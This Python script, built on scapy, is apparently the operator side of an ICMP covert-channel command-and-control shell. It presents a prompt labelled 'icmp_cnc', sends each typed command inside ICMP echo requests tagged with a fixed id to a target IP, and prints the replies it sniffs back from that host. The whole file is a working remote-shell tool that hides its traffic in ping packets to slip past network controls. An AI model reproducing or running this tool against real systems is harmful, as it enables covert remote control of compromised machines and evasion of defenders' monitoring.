from scapy.all import *
from multiprocessing import Process
import argparse
from colorama import Fore

## globals
icmp_id = int(13170)

def check_scapy():
    try:
        import scapy
    except ImportError:
        print("Install the scapy module")


def sniffer():
    sniff(iface=args.interface, prn=shell, filter="icmp", store="0")


def shell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
        newpkt = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
        print(newpkt)
    else:
        pass

def main():
    p = Process(target=sniffer)
    p.start()


if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
	parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
	args = parser.parse_args()

	main()
	HOSTNAME = os.popen("whoami").read().strip()
	while True:
		try:
			icmpshell = input(Fore.RED+f"{HOSTNAME}@icmp_cnc$ "+Fore.RESET)
		except KeyboardInterrupt:
			sys.exit()

		payload = (IP(dst=args.destination_ip)/ICMP(type=8,id=icmp_id)/Raw(load=icmpshell))
		if icmpshell == '':
			pass
		else:
			sr(payload, timeout=0, verbose=0)
